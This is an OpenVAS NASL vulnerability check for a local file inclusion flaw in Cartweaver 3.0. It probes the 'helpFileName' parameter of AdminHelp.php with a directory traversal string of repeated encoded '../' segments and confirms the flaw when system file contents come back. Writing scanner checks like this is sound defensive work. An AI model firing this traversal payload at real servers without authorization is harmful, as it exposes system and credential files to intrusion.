###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cartweaver_helpfilename_param_lfi_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# Cartweaver 'helpFileName' Parameter Local File Include Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802997");
  script_version("$Revision: 7577 $");
  script_bugtraq_id(55917);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2012-10-16 17:35:45 +0530 (Tue, 16 Oct 2012)");
  script_name("Cartweaver 'helpFileName' Parameter Local File Include Vulnerability");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/79227");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/21989/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : "Successful exploitation could allow attackers to perform directory
  traversal attacks and read arbitrary files on the affected application.

  Impact Level: Application");
  script_tag(name : "affected" , value : "Cartweaver version 3.0");
  script_tag(name : "insight" , value : "Input passed via 'helpFileName' parameter to AdminHelp.php is
  not properly sanitised before being used to include files.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name : "summary" , value : "This host is running Cartweaver and is prone to local file
  inclusion vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/cartweaver", "/cartScripts", "/cw", cgi_dirs(port:port)))
{
  if(dir == "/") dir = "";
  url = dir + "/admin/helpfiles/AdminHelp.php";

  ## Confirm the application
  if(http_vuln_check(port:port, url:url, pattern:">Cartweaver",
                 check_header:TRUE))
  {
    ## traversal_files() function Returns Dictionary (i.e key value pair)
    ## Get Content to be checked and file to be check
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct directory traversal attack
      url = url + "?helpFileName=a/" + crap(data:"..%2f",length:3*15) +
            files[file];

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:port, url:url,pattern:file))
      {
        security_message(port:port);
        exit(0);
      }
    }
  }
}

exit(99);